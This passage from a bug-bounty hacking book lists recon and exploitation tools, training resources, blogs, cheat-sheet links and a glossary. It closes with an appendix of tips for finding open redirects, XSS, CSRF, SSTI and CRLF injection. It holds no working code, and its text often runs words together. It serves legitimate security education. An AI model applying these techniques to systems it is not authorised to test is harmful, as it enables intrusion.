Their website has a lot of useful\ninformation to help you get started.\nTools 200\nKnockpy\nhttps://github.com/guelfoweb/knock\nKnockpy is a python tool designed to iterate over a huge word list to identify sub\ndomains of a company. Identifying sub domains helps to increase the testable surface\nof a company and increase the chances of finding a successful vulnerability.\nThis is a GitHub repository which means you’ll need to download the repo (the GitHub\npagehasinstructionsastohow)andneedPythoninstalled(theyhavetestedwithversion\n2.7.6 and recommend you use Google DNS (8.8.8.8 | 8.8.4.4).\nHostileSubBruteforcer\nhttps://github.com/nahamsec/HostileSubBruteforcer\nThis app, written by @nahamsec (Ben Sadeghipour - great guy!), will bruteforce for\nexistingsubdomainsandprovidetheIPaddress,Hostandwhetherithasbeenproperly\nsetup,checkingAWS,Github,Heroku,Shopify,TumblrandSquarespace.Thisisgreatfor\nfinding sub domain takeovers.\nSublist3r\nhttps://github.com/aboul3la/Sublist3r\nAccordingtoit’sREADME.md,Sublist3rispythontoolthatisdesignedtoenumeratesub\ndomains of websites using search engines. It helps penetration testers and bug hunters\ncollect and gather sub domains for the domain they are targeting. Sublist3r currently\nsupportsthefollowingsearchengines:Google,Yahoo,Bing,Baidu,andAsk.Moresearch\nengines may be added in the future. Sublist3r also gathers sub domains using Netcraft,\nVirustotal, ThreatCrowd, DNSdumpster and PassiveDNS.\nThe tool, subbrute, was integrated with Sublist3r to increase the possibility of finding\nmore sub domains using bruteforce with an improved wordlist. The credit goes to\nTheRook who is the author of subbrute.\ncrt.sh\nhttps://crt.sh\nAsearchsiteforbrowsingCertificateTransactionlogs,revealingsubdomainsassociated\nwith certificates.\nTools 201\nIPV4info.com\nhttp://ipv4info.com\nThis is a great site that I just learned about thanks to Philippe Harewood (again!). Using\nthis site, you can find domains hosted on a given server. So, for example, entering\nyahoo.com will give you Yahoo’s IPs range and all the domains served from the same\nservers.\nSecLists\nhttps://github.com/danielmiessler/SecLists\nWhile technically not a tool in and of itself, SecLists is a collection of multiple types of\nlists used during hacking. This includes usernames, passwords, URLs, fuzzing strings,\ncommondirectories/files/subdomains,etc.TheprojectismaintainedbyDanielMiessler\nand Jason Haddix (Hacking ProTips #5 guest)\nXSSHunter\nhttps://xsshunter.com\nXSSHunter is a tool developed by Matt Bryant1 (formerly of the Uber security team)\nwhichhelpsyoufindblindXSSvulnerabilities,orXSSthatyoudon’tseefireforwhatever\nreason. After signing up for XSSHunter, you get a special xss.ht short domain which\nidentifies your XSS and hosts your payload. When the XSS fires, it will automatically\ncollects information about where it occurred and will send you an email notification.\nsqlmap\nhttp://sqlmap.org\nsqlmap is an open source penetration tool that automates the process of detecting and\nexploitingSQLinjectionvulnerabilities.Thewebsitehasahugelistoffeatures,including\nsupport for:\n• A wide range of database types (e.g., MySQL, Oracle, PostgreSQL, MS SQL Server,\netc.)\n1https://twitter.com/iammandatory\nTools 202\n• Six SQL injection techniques (e.g., boolean-based blind, time-based blind, error-\nbased, UNION query-based, etc)\n• Enumerating users, password hashes, privileges, roles, databases, tables and\ncolumns\n• And much more￿\nAccording to Michiel Prins, sqlmap is helpful for automating the exploitation of SQL\ninjection vulnerabilities to prove something is vulnerable, saving a lot of manual work.\nSimilar to Knockpy, sqlmap relies on Python and can be run on Windows or Unix based\nsystems.\nNmap\nhttps://nmap.org\nNmap is a free and open source utility for network discover and security auditing.\nAccording to their site, Nmap uses raw IP packets in novel ways to determine: - Which\nhosts are available on a network - What services (application name and version) those\nhosts are offering - What operating systems (and versions) they are running - What type\nof packet filters/firewalls are in use - And much more￿\nTheNmapsitehasarobustlistofinstallationinstructionssupportingWindows,Macand\nLinux.\nEyewitness\nhttps://github.com/ChrisTruncer/EyeWitness\nEyeWitnessisdesignedtotakescreenshotsofwebsites,providesomeserverheaderinfo\nand identify default credentials if possible. It’s a great tool for detecting what services\nare running on common HTTP and HTTPS ports and can be used with other tools like\nNmap to quickly enumerate hacking targets.\nShodan\nhttps://www.shodan.io\nShodan is the internet search engine of “Things”. According to the site, you can, “Use\nShodan to discover which of your devices are connected to the internet, where they are\nlocated and who is using them”. This is particularly helpful when you are exploring a\npotentialtargetandtryingtolearnasmuchaboutthetargetsinfrastructureaspossible.\nTools 203\nCombined with this is a handy Firefox plugin for Shodan which allows you to quickly\naccessinformationforaparticulardomain.Sometimesthisrevealsavailableportswhich\nyou can pass to Nmap.\nCensys\nhttps://censys.io\nCensysisasearchenginethatenablesresearcherstoaskquestionsaboutthehostsand\nnetworksthatcomposetheInternet.Censyscollectsdataonhostsandwebsitesthrough\ndaily ZMap and ZGrab scans of the IPV4 address space, in turn maintaining a database\nof how hosts and websites are configured.\nWhat CMS\nhttp://www.whatcms.org\nWhat CMS is a simple application which allows you to enter a site url and it’ll return the\nlikely Content Management System the site is using. This is helpful for a couple reason:\n• Knowing what CMS a site is using gives you insight into how the site code is\nstructured\n• If the CMS is open source, you can browse the code for vulnerabilities and test\nthem on the site\n• If you can determine the version code of the CMS, it’s possible the site may be\noutdated and vulnerable to disclosed security vulnerabilities\nBuiltWith\nhttp://builtwith.com\nBuiltWith is an interesting tool that will help you fingerprint different technologies used\non a particular target. According to its site, it covers over 18,000 types of internet\ntechnologies, including analytics, hosting, which CMS, etc.\nNikto\nhttps://cirt.net/nikto2\nNikto is an Open Source web server scanner which tests against servers for multiple\nitems, including:\nTools 204\n• Potentially dangerous files/programs\n• Outdated versions of servers\n• Version specific problems\n• Checking for server configuration items\nAccording to Michiel, Nikto is helpful for finding files or directories that should not be\navailable (e.g., an old SQL backup file, or the inside of a git repo)\nRecon-ng\nhttps://bitbucket.org/LaNMaSteR53/recon-ng\nAccording to its page, Recon-ng is a full featured Web Reconnaissance framework\nwritten in Python. It provides a powerful environment in which open source web-based\nreconnaissance can be conducted quickly and thoroughly.\nUnfortunately,orfortunatelydependingonhowyouwanttolookatit,Recon-ngprovides\nso much functionality that I can’t adequately describe it here. It can be used for sub\ndomaindiscovery,sensitivefilediscovery,usernameenumeration,scrapingsocialmedia\nsites, etc.\nGitRob\nhttps://github.com/michenriksen/gitrob\nGitrob is a command line tool which can help organizations and security professionals\nfind sensitive information lingering in publicly available files on GitHub. The tool will it-\nerateoverallpublicorganizationandmemberrepositoriesandmatchfilenamesagainst\na range of patterns for files that typically contain sensitive or dangerous information.\nCyberChef\nhttps://gchq.github.io/CyberChef/\nCyberChef is a swiss army knife providing all kinds of encoding/decoding tools. It also\nprovides functionality to save a list of favorites, download results, among many other\nthings.\nTools 205\nOnlineHashCrack.com\nwww.onlinehashcrack.com\nOnlineHash Crackis anonline servicethat attemptsto recoveryour passwords(hashes\nlike MD5, NTLM, Wordpress, etc), your WPA dumps (handshakes) and your MS Office\nencryptedfiles(obtainedlegally).Itisusefultohelpidentifywhattypeofhashisusedif\nyou don’t know, supporting the identification of over 250 hash types.\nidb\nhttp://www.idbtool.com\nidb is a tool to help simplify some common tasks for iOS app security assessments and\nresearch. It’s hosted on GitHub.\nWireshark\nhttps://www.wireshark.org\nWireshark is a network protocol analyzer which lets you see what is happening on your\nnetwork in fine detail. This is more useful when a site isn’t just communicating over\nHTTP/HTTPS. If you are starting out, it may be more beneficial to stick with Burp Suite if\nthe site is just communicating over HTTP/HTTPS.\nBucket Finder\nhttps://digi.ninja/files/bucket_finder_1.1.tar.bz2\nA cool tool that will search for readable buckets and list all the files in them. It can\nalso be used to quickly find buckets that exist but deny access to listing files - on these\nbuckets, you can test out writing using the AWS CLI and described in Example 6 of the\nAuthentication Chapter - How I hacked HackerOne S3 Buckets.\nRace the Web\nhttps://github.com/insp3ctre/race-the-web\nA newer tool which tests for race conditions in web applications by sending out a user-\nspecified number of requests to a target URL (or URLs) simultaneously, and then com-\nparestheresponsesfromtheserverforuniqueness.Includesanumberofconfiguration\noptions.\nTools 206\nGoogle Dorks\nhttps://www.exploit-db.com/google-hacking-database\nGoogleDorkingreferstousingadvancesyntaxesprovidedbyGoogletofindinformation\nnotreadilyavailable.Thiscanincludefindingvulnerablefiles,opportunitiesforexternal\nresource loading, etc.\nJD GUI\nhttps://github.com/java-decompiler/jd-gui\nJD-GUIisatoolwhichcanhelpwhenexploringAndroidapps.It’sastandalonegraphical\nutility that displays Java sources from CLASS files. While I don’t have much experience\nwith this tool (yet), it seems promising and useful.\nMobile Security Framework\nhttps://github.com/ajinabraham/Mobile-Security-Framework-MobSF\nThis is another tool useful for mobile hacking. It’s an intelligent, all-in-one open source\nmobileapplication(Android/iOS)automatedpen-testingframeworkcapableofperform-\ning static, dynamic analysis and web API testing.\nYsoserial\nhttps://github.com/frohoff/ysoserial\nA proof-of-concept tool for generating payloads that exploit unsafe Java object deserial-\nization\nFirefox Plugins\nThis list is largely thanks to the post from the Infosecinstitute available here: InfosecIn-\nstitute2\nFoxyProxy\nFoxyProxy is an advanced proxy management add-on for Firefox browser. It improves\nthe built-in proxy capabilities of Firefox.\n2resources.infosecinstitute.com/use-firefox-browser-as-a-penetration-testing-tool-with-these-add-ons\nTools 207\nUser Agent Switcher\nAddsamenuandtoolbarbuttoninthebrowser.Wheneveryouwanttoswitchtheuser\nagent, use the browser button. User Agent add on helps in spoofing the browser while\nperforming some attacks.\nFirebug\nFirebugisaniceadd-onthatintegratesawebdevelopmenttoolinsidethebrowser.With\nthis tool, you can edit and debug HTML, CSS and JavaScript live in any webpage to see\nthe effect of changes. It helps in analyzing JS files to find XSS vulnerabilities.\nHackbar\nHackbar is a simple penetration tool for Firefox. It helps in testing simple SQL injection\nand XSS holes. You cannot execute standard exploits but you can easily use it to test\nwhethervulnerabilityexistsornot.YoucanalsomanuallysubmitformdatawithGETor\nPOST requests.\nWebsecurify\nWebSecurify can detect most common vulnerabilities in web applications. This tool can\neasily detect XSS, SQL injection and other web application vulnerability.\nCookie Manager+\nAllows you to view, edit and create new cookies. It also shows extra information about\ncookies, edit multiple cookies at once, backup and restore cookies, etc.\nXSS Me\nXSS-Me is used to find reflected XSS vulnerabilities from a browser. It scans all forms\nof the page, and then performs an attack on the selected pages with pre-defined XSS\npayloads. After the scan is complete, it lists all the pages that renders a payload on the\npage, and may be vulnerable to XSS. With those results, you should manually confirm\nthe vulnerabilities found.\nOffsec Exploit-db Search\nThisletsyousearchforvulnerabilitiesandexploitslistedinexploit-db.com.Thiswebsite\nis always up-to-date with latest exploits and vulnerability details.\nTools 208\nWappalyzer\nhttps://addons.mozilla.org/en-us/firefox/addon/wappalyzer/\nThis tool will help you identify the technologies used on a site, including things like\nCloudFlare, Frameworks, Javascript Libraries, etc.\n24. Resources\nOnline Training\nWeb Application Exploits and Defenses\nA codelab with an actual vulnerable webapp and tutorials for you to work\nthrough to discover common vulnerabilities including XSS, Privilege Escala-\ntion,CSRF,PathTraversalandmore.Finditathttps://google-gruyere.appspot.com\nThe Exploit Database\nThough not exactly online training, this site includes exploits for discovered\nvulnerabilities, often linking them to CVEs where possible. While using the\nactual code supplied should be done with extreme caution as it can be\ndestructive, this is helpful for finding vulnerabilities if a target is using out\nof site software and reading the code is helpful to understand what type of\ninput can be supplied to exploit a site.\nUdacity\nFree online learning courses in a variety of subjects, including web develop-\nment and programming. I’d recommend checking out:\nIntro to HTML and CSS1 Javascript Basics2\nBug Bounty Platforms\nHackerone.com\nCreatedbysecurityleadersfromFacebook,MicrosoftandGoogle,HackerOne\nis the first vulnerability coordination and bug bounty platform.\n1https://www.udacity.com/course/intro-to-html-and-css--ud304\n2https://www.udacity.com/course/javascript-basics--ud804\nResources 210\nBugcrowd.com\nFromtheoutbacktothevalley,Bugcrowdiswasfoundedin2012toeventhe\nodds against the bad guys.\nSynack.com\nAprivateplatformofferingsecurityexpertisetoclients.Participationrequires\napproval but is definitely the application process. Reports are typically re-\nsolved and rewarded within 24 hours.\nCobalt.io\nA bug bounty platform which also has a core group of researchers working\non private programs.\nVideo Tutorials\nyoutube.com/yaworsk1\nI’d be remiss if I didn’t include my YouTube channel￿ I’ve begun to record\ntutorials on finding vulnerabilities to help compliment this book.\nSeccasts.com\nFrom their website, SecCasts is a security video training platform that offers\ntutorials ranging from basic web hacking techniques to in-depth security\ntopics on a specific language or framework.\nHow to Shot Web\nWhile technically not a video tutorial, Jason Haddix’s (Hacking ProTips #5\nguest)presentationfromDefCon23providesawesomeinsightintobecoming\na better hacker. He based the material on his own hacking (he was #1\non Bugcrowd before joining them) and research reading blog posts and\ndisclosures from other top hackers.\nResources 211\nFurther Reading\nOWASP.com\nThe Open Web Application Security Project is a massive source of vulnera-\nbility information. They have a convenient Security101 section, cheat sheets,\ntesting guide and in-depth descriptions on most vulnerability types.\nHackerone.com/hacktivity\nAlistofallvulnerabilitiesreportedonfromtheirbountyprogram.Whileonly\nsome reports are public, you can use my script on GitHub to pull all of the\npublic disclosures (https://github.com/yaworsk/hackerone_scrapper).\nhttps://bugzilla.mozilla.org\nMozilla’sbugtrackersystem.Thisincludesallsecurityrelatedissuesreported\ntotheirbugbountyprogram.Thisisagreatresourcetoreadaboutwhatwas\nfoundandhowMozillahandledit,includingfindingareaswheretheirfixmay\nnot have been complete.\nTwitter #infosec and #bugbounty\nThough a lot of noise, there are a lot of interesting security / vulnerability\nrelated tweets with under #infosec and #bugbounty, often with links to\ndetailed write ups.\nTwitter @disclosedh1\nThe unofficial HackerOne public disclosure watcher which tweets recently\ndisclosed bugs.\nWeb Application Hackers Handbook\nThetitleshouldsayitall.WrittenbythecreatorsofBurpSuite,thisisreallya\nmust read.\nResources 212\nBug Hunters Methodology\nThis is a GitHub repo from Jason Haddix (Hacking ProTips #5 guest) and\nprovides some awesome insight into how successful hackers approach a\ntarget.It’swritteninMarkDownandisabyproductofJason’sDefCon23How\ntoShotWebpresentation.Youcanfinditathttps://github.com/jhaddix/tbhm.\nRecommended Blogs\nphilippeharewood.com\nBlogbyanamazingFacebookhackerwhosharesanincredibleamountabout\nfinding logic flaws in Facebook. I was lucky enough to interview Philippe in\nApril 2016 and can’t stress enough how smart he is and awesome his blog is\n- I’ve read every post.\nPhilippe’s Facebook Page -\nwww.facebook.com/phwd-113702895386410\nAnother awesome resource from Philippe. This includes a list of Facebook\nBug Bounties.\nfin1te.net\nBlog by the Second ranked Facebook Whitehat Program for the past two\nyears (2015, 2014). Jack doesn’t seem to post much but when he does, the\ndisclosures are in-depth and informative!\nNahamSec.com\nBlog by the #26 (as of February 2016) hacker on HackerOne. A lot of cool\nvulnerabilities described here - note most posts have been archived but still\navailable on the site.\nblog.it-securityguard.com\nPatrik Fehrehbach’s personal blog. Patrik has found a number of cool and\nhighimpactvulnerabilitiesbothdetailedinthisbookandonhisblog.Hewas\nalso the second interviewee for Hacking Pro Tips.\nResources 213\nblog.innerht.ml\nAnother awesome blog by a top Hacker on HackerOne. Filedescriptor has\nfoundsomebugsonTwitterwithamazinglyhighpayoutsandhisposts,while\ntechnical, are detailed and very well written!\nblog.orange.tw\nBlog by a Top DefCon hacker with links to tonnes of valuable resources.\nPortswigger Blog\nBlog from the developers of Burp Suite. HIGHLY RECOMMENDED\nNvisium Blog\nGreat blog from a security company. They found the Rails RCE vulnerability\ndiscussed and blogged about finding vulnerabilities with Flask/Jinja2 almost\ntwo weeks before the Uber RCE was found.\nblog.zsec.uk\nBlog from #1 PornHub hacker as of June 7, 2016.\nbrutelogic.com.br\nBlog by the Brazilian hacker @brutelogic. This has some amazingly detailed\ntips and tricks for XSS attacks. @brutelogic is a talented hacker with an awe-\nsomeportfolioofXSSdisclosuresathttps://www.openbugbounty.org/researchers/Brute/\nlcamtuf.blogspot.ca\nMichal Zalewski’s (Google) blog which includes some more advanced topics\ngreat for getting your feet wet with advanced topics. He is also the author of\nThe Tangled Web.\nBug Crowd Blog\nBug Crowd posts some great content including interviews with awesome\nhackers and other informative material. Jason Haddix has also recently\nstarted a hacking podcast which you can find via the blog.\nResources 214\nHackerOne Blog\nHackerOne also posts content useful content for hackers like recommended\nblogs, new functionality on the platform (good place to look for new vulner-\nabilities!) and tips on becoming a better hacker.\nCheatsheets\n• Path Traversal Cheat Sheet Linux - https://www.gracefulsecurity.com/path-traver-\nsal-cheat-sheet-linux/\n• XXE - https://www.gracefulsecurity.com/xxe-cheatsheet/\n• HTML5 Security Cheat Sheet - https://html5sec.org/\n• Brute XSS Cheat Sheet - http://brutelogic.com.br/blog/cheat-sheet/\n• XSS Polyglots - http://polyglot.innerht.ml/\n• MySQL SQL Injection Cheat Sheet - http://pentestmonkey.net/cheat-sheet/sql-in-\njection/mysql-sql-injection-cheat-sheet\n• AngularJSSandboxBypassCollection(Includes1.5.7)-http://pastebin.com/xMXwsm0N\n25. Glossary\nBlack Hat Hacker\nA Black Hat Hacker is a hacker who “violates computer security for little\nreason beyond maliciousness or for personal gain” (Robert Moore, 2005,\nCybercrime). Black Hats are also referred to as the “crackers” within the\nsecurity industry and modern programmers. These hackers often perform\nmalicious actions to destroy, modify or steal data. This is the opposite of a\nWhite Hat Hacker.\nBuffer Overflow\nA Buffer Overflow is a situation where a program writing data to a buffer, or\narea of memory, has more data to write than space that is actually allocated\nforthatmemory.Asaresult,theprogramendsupwritingovermemorythat\nis it should not be.\nBug Bounty Program\nA deal offered by websites whereby White Hat Hackers can receive recogni-\ntionorcompensationforreportingbugs,particularlysecurityrelatedvulner-\nabilities. Examples include HackerOne.com and Bugcrowd.com\nBug Report\nA Researcher’s description of a potential security vulnerability in a particular\nproduct or service.\nCRLF Injection\nCRLF, or Carriage Return Line Feed, Injection is a type of vulnerability that\noccurs when a user manages to insert a CRLF into an application. This is\nsometimes also called HTTP Response Splitting.\nGlossary 216\nCross Site Request Forgery\nA Cross Site Request Forgery, or CSRF, attack occurs when a malicious\nwebsite,email,instantmessage,application,etc.causesauser’swebbrowser\nto perform some action on another website where that user is already\nauthenticated, or logged in.\nCross Site Scripting\nCrosssitescripting,orXSS,involveawebsiteincludingunintendedJavascript\ncode which is subsequently passes on to users which execute that code via\ntheir browsers.\nHTML Injection\nHypertext Markup Language (HTML) injection, also sometimes referred to as\nvirtual defacement, is really an attack on a site made possible by allowing a\nmalicious user to inject HTML into the site by not handling that user’s input\nproperly.\nHTTP Parameter Pollution\nHTTPParameterPollution,orHPP,occurswhenawebsiteacceptsinputfrom\na user and uses it to make an HTTP request to another system without\nvalidating that user’s input.\nHTTP Response Splitting\nAnother name for CRLF Injection where a malicious user is able to inject\nheaders into a server response.\nMemory Corruption\nMemory corruption is a technique used to expose a vulnerability by causing\ncode to perform some type of unusual or unexpected behaviour. The effect\nis similar to a buffer overflow where memory is exposed when it shouldn’t\nbe.\nGlossary 217\nOpen Redirect\nAnopenredirectoccurswhenanapplicationtakesaparameterandredirects\na user to that parameter value without any conducting any validation on the\nvalue.\nPenetration Testing\nA software attack on a computer system that looks for security weaknesses,\npotentially gaining access to the computer’s features and data. These can\ninclude legitimate, or company endorsed, tests or illegitimate tests for ne-\nfarious purposes.\nResearchers\nAlso known as White Hat Hackers. Anyone who has investigated a potential\nsecurity issue in some form of technology, including academic security\nresearchers, software engineers, system administrators, and even casual\ntechnologists.\nResponse Team\nA team of individuals who are responsible for addressing security issues\ndiscovered in a product or service. Depending on the circumstances, this\nmightbeaformalresponseteamfromanorganization,agroupofvolunteers\non an open source project, or an independent panel of volunteers.\nResponsible Disclosure\nDescribingavulnerabilitywhileallowingaresponseteamanadequateperiod\nof time to address the vulnerability before making the vulnerability public.\nVulnerability\nAsoftwarebugthatwouldallowanattackertoperformanactioninviolation\nof an expressed security policy. A bug that enables escalated access or\nprivilegeisavulnerability.Designflawsandfailurestoadheretosecuritybest\npractices may qualify as vulnerabilities.\nGlossary 218\nVulnerability Coordination\nA process for all involved parties to work together to address a vulnerability.\nFor example, a research (white hat hacker) and a company on HackerOne or\na researcher (white hat hacker) and an open source community.\nVulnerability Disclosure\nA vulnerability disclosure is the release of information about a computer se-\ncurity problem. There are no universal guidelines about vulnerability disclo-\nsuresbutbugbountyprogramsgenerallyhaveguidelinesonhowdisclosures\nshould be handled.\nWhite Hat Hacker\nA White Hat Hacker is an ethical hacker who’s work is intended to ensure\nthe security of an organization. White Hat’s are occasionally referred to as\npenetration testers. This is the opposite of a Black Hat Hacker.\n26. Appendix A - Take Aways\nOpen Redirects\nNotallvulnerabilitiesarecomplex.Thisopenredirectsimplyrequiredchanging\nthe domain_name parameter to an external site, which would have resulted in\nauserbeingredirectedoff-sitefromShopify.\nRedirectparametersmaynotalwaysbeobviouslylabeled,sinceparameterswill\nbe named differently from site to site or even within a site. In some cases you\nmayevenfindthatparametersarelabeledwithjustsinglecharactersliker=,or\nu=.Whenlookingforopenredirects,keepaneyeoutforURLparameterswhich\nincludethewordsURL,redirect,next,andsoon,whichmaydenotepathswhich\nsiteswilldirectusersto.\nAdditionally,ifyoucanonlycontrolaportionofthefinalURLreturnedbythesite,\nforexample,onlythecheckout_urlparametervalue,andnoticetheparameteris\nbeingcombinedwithahard-codedURLontheback-endofthesite,likethestore\nURLhttp://mystore.myshopify.com,tryaddingspecialURLcharacterslikeaperiodor\n@tochangethemeaningoftheURLandredirectausertoanotherdomain.\nAs you search for vulnerabilities, take note of the services a site uses as they\neach represent new attack vectors. Here, this vulnerability was made possible\nby combining HackerOne’s use of Zendesk and the known redirect they were\npermitting.\nAdditionally,asyoufindbugs,therewillbetimeswhenthesecurityimplications\nare not readily understood by the person reading and responding to your\nreport.ThisiswhyIhaveachapteronVulnerabilityReportswhichcoversdetails\nto include in a report, how to build relationships with companies, and other\ninformation.Ifyoudoalittleworkupfrontandrespectfullyexplainthesecurity\nimplicationsinyourreport,itwillhelpensureasmootherresolution.\nBut, even that said, there will be times when companies don’t agree with you.\nIf that’s the case, keep digging like Mahmoud did and see if you can prove the\nexploitorcombineitwithanothervulnerabilitytodemonstrateeffectiveness.\nAppendixA-TakeAways 220\nHTTP Parameter Pollution\nBe on the lookout for opportunities when websites accept content and appear\ntobecontactinganotherwebservice,likesocialmediasites,andrelyingonthe\ncurrentURLtogeneratethelinktocreateasharedpost.\nIn these situations, it may be possible that submitted content is being passed\non without undergoing proper security checks, which could lead to parameter\npollutionvulnerabilities.\nThough a short description, Mert’s efforts demonstrate the importance of per-\nsistence and knowledge. If he had walked away from the vulnerability after\nchanging the UID to another user’s and failing or had he not know about HPP-\ntypevulnerabilities,hewouldn’thavereceivedhis$700bounty.\nAlso,keepaneyeoutforparameters,likeUID,beingincludedinHTTPrequests\nas a lot of vulnerabilities involve manipulating parameter values to make web\napplicationsdoingunexpectedthings.\nThis is similar to the previous UID Twitter vulnerability. Unsurprisingly, when a\nsite is vulnerable to a flaw like HPP, it may be indicative of a broader systemic\nissue. Sometimes if you find a vulnerability like this, it’s worth taking the time\nto explore the platform in its entirety to see if there are other areas where you\nmightbeabletoexploitsimilarbehavior.\nCross Site Request Forgery\nInthissituation,thevulnerabilitycouldhavebeenfoundbyusingaproxyserver,\nlike Burp or OWASP’s ZAP, to monitor the HTTP requests being sent to Shopify\nand noting that this was a GET request. GET requests should never modify any\ndata on the server, but WeSecureApp was able to take destructive action with\none,soyoushouldalsolookintothesetypesofrequestsaswell.\nWhen looking for exploits, broaden your attack scope and look beyond just\na site’s pages to include its API endpoints, which offer great potential for\nvulnerabilities. Occasionally, developers sometimes forget that API endpoints\ncanbediscoveredandexploitedsincetheyaren’treadilyavailablelikewebpages\n(forexample,mobileAPIendpointsrequireinterceptingyourphonetraffic).\nAppendixA-TakeAways 221\nWherethereissmoke,there’sfire.Here,Mahmoudnoticedthatthertparameter\nwasbeingreturnedindifferentlocations,inparticularJSONresponses.Because\nof that, he rightly guessed the rt might show up somewhere where it could be\naccessed by an attacker and exploitedâ￿”which in this case was a JavaScript\nfile.Ifyoufeellikesomethingisoff,keepdigging.Useaproxyandcheckallthe\nresources that are being called when you visit a target site or application. You\nmayfindaninformationleakwithsensitivedata,suchasaCSRFtoken.\nAdditionally,thisisagreatexampleofgoingtheextramiletoprovideawesome\nproof of an exploit. Not only did Mahmoud find the vulnerability, but he also\nprovidedafullexampleofhowitcouldbeexploitedviahisHTML.\nHTML Injection\nWhen you’re testing out a site, check to see how it handles different types of\ninput,includingplaintextandencodedtext.Beonthelookoutforsitesthatare\naccepting URI encoded values like %2F and rendering their decoded values, in\nthis case /. While we don’t know what the hacker was thinking in this example,\nit’s possible they tried to URI encode restricted characters and noticed that\nCoinbasewasdecodingthem.TheythenwentonestepfurtherandURIencoded\nallcharacters.\nA great swiss army knife which includes encoding tools is\nhttps://gchq.github.io/CyberChef/. I recommend checking it out and adding it\ntoyourlistofusefultools.\nJustbecausecodeisupdated,doesn’tmeaneverythingisfixed.Testthingsout.\nWhenachangeisdeployed,thatalsomeansnewcodewhichcouldcontainbugs.\nAdditionally,ifyoufeellikesomethingisn’tright,keepdigging!Iknewtheinitial\ntrailingsinglequotecouldbeaproblem,butIdidn’tknowhowtoexploititand\nstopped. I should have kept going. I actually learned about the meta refresh\nexploit by reading FileDescriptor’s blog.innerht.ml (it’s included in the Resources\nchapter)butmuchlater.\nKeep an eye on URL parameters which are being passed and rendered as\nsite content. They may present opportunities for attackers to trick victims\ninto performing some malicious action. Sometimes this results in Cross Site\nScripting Attacks whereas other times is less impactful content spoofing and\nHTMLinjection.It’simportanttokeepinmind,whilethisreportpaid$250,that\nwastheminimumbountyforWithinSecurityandnotallprogramsvalueandpay\nforthesetypesofreports.\nAppendixA-TakeAways 222\nCRLF Injections\nGoodhackingisacombinationofobservationandskill.Inthiscase,@filedescrip-\ntor knew of a previous Firefox encoding bug which mishandled encoding.\nDrawing on that knowledge led him to test out similar encoding on Twitter to\ngetmaliciouscharactersinserted.\nWhenyouarelookingforvulnerabilities,alwaysremembertothinkoutsidethe\nboxandsubmitencodedvaluestoseehowthesitehandlestheinput.\nBeonthelookoutforopportunitieswhereasiteisacceptingyourinputandusing\nit as part of its return headers, particularly setting cookies. This is particularly\nsignificantwhenitoccursviaaGETrequestaslessinteractionfromthevictimis\nrequired.\nCross-Site Scripting\nTest everything, paying particular attention for situations where text you enter\nisbeingrenderedbacktoyou.TesttodeterminewhetheryoucanincludeHTML\norJavascripttoseehowthesitehandlesit.Alsotryencodedinputsimilartothat\ndescribedintheHTMLInjectionchapter.\nXSS vulnerabilities don’t have to be intricate or complicated. This vulnerability\nwasthemostbasicyoucanfind-asimpleinputtextfieldwhichdidnotsanitize\na user’s input. And it was discovered on December 21, 2015 and netted the\nhacker$500!Allitrequiredwasahacker’sperspective.\nAppendixA-TakeAways 223\nThere are two things to note here which will help when finding XSS vulnerabili-\nties:\n1. The vulnerability in this case wasn’t actually on the file input field itself -\nitwasonthenamepropertyofthefield.SowhenyouarelookingforXSS\nopportunities,remembertoplaywithallinputvaluesavailable.\n2. Thevalueherewassubmittedafterbeingmanipulatedbyaproxy.Thisis\nkey in situations where there may be Javascript validating values on the\nclientside(yourbrowser)beforeanyvaluesactuallygetbacktothesite’s\nserver.\nInfact,anytimeyouseevalidationhappeninginrealtimeinyourbrowser,\nitshouldbearedflagthatyouneedtotestthatfield!Developersmaymake\nthemistakeofnotvalidatingsubmittedvaluesformaliciouscodeoncethevalues\nget to their server because they think the browser Javascript code has already\nhandlingvalidationsbeforetheinputwasreceived.\nXSS vulnerabilities result when the Javascript text is rendered insecurely. It is\npossible that the text will be used in multiple places on a site and so each and\nevery location should be tested. In this case, Shopify does not include store or\ncheckout pages for XSS since users are permitted to use Javscript in their own\nstore. It would have been easy to write this vulnerability off before considering\nwhetherthefieldwasusedontheexternalsocialmediasites.\nPassingmalformedorbrokenHTMLisagreatwaytotesthowsitesareparsing\ninput. As a hacker, it’s important to consider what the developers haven’t. For\nexample, with regular image tags, what happens if you pass two src attributes?\nHowwillthatberendered?\nAlwaysbeonthelookoutforvulnerabilities.It’seasytoassumethatjustbecause\na company is huge or well known, that everything has been found. However,\ncompaniesalwaysshipcode.\nIn addition, there are a lot of ways javascript can be executed, it would have\nbeeneasyinthiscasetogiveupafterseeingthatGooglechangedthevaluewith\nan onmousedown event handler, meaning anytime the link was clicked, with a\nmouse.\nAppendixA-TakeAways 224\nTwo things are interesting here. First, Patrik found an alternative to providing\ninput - be on the lookout for this and test all methods a target provides to\nenter input. Secondly, Google was sanitizing the input but not escaping when\nrendering. Had they escaped Patrik’s input, the payload would not have fired\nsincetheHTMLwouldhavebeenconvertedtoharmlesscharacters.\nThere are a number of things I liked about this vulnerability that made me\nwant to include this. First, Mustafa’s persistence. Rather than give up when his\npayload wouldn’t fire originally, he dug into the Javascript code and found out\nwhy. Secondly, the use of blacklists should be a red flag for all hackers. Keep\nan eye out for those when hacking. Lastly, I learned a lot from the payload and\ntalkingwith@brutelogic.AsIspeakwithhackersandcontinuinglearningmyself,\nit’s becoming readily apparent that some Javascript knowledge is essential for\npullingoffmorecomplexvulnerabilities.\nSSTI\nBe on the lookout for the use of AngularJS and test out fields using the Angular\nsyntax {{ }}. To make your life easier, get the Firefox plugin Wappalyzer - it will\nshowyouwhatsoftwareasiteisusing,includingtheuseofAngularJS.\nTake note of what technologies a site is using, these often lead to key insights\ninto how you can exploit a site. In this case, Flask and Jinja2 turned out to be\ngreat attack vectors. And, as is the case with some of the XSS vulnerabilities,\nthevulnerabilitymaynotbeimmediateorreadilyapparent,besuretocheckall\nplaces were the text is rendered. In this case, the profile name on Uber’s site\nshowedplaintextanditwastheemailwhichactuallyrevealedthevulnerability.\nThis vulnerability wouldn’t exist on every single Rails site - it would depend on\nhowthesitewascoded.Asaresult,thisisn’tsomethingthataautomatedtoolwill\nnecessarilypickup.BeonthelookoutwhenyouknowasiteisbuiltusingRailsas\nmostfollowacommonconventionforURLs-atthemostbasic,it’s/controller/id\nforsimpleGETrequests,or/controller/id/editforedits,etc.\nWhenyouseethisurlpatternemerging,startplayingaround.Passinunexpected\nvaluesandseewhatgetsreturned.\nAppendixA-TakeAways 225\nSQL Injection\nThis example was interesting because it wasn’t a matter of submitting a single\nquote and breaking a query. 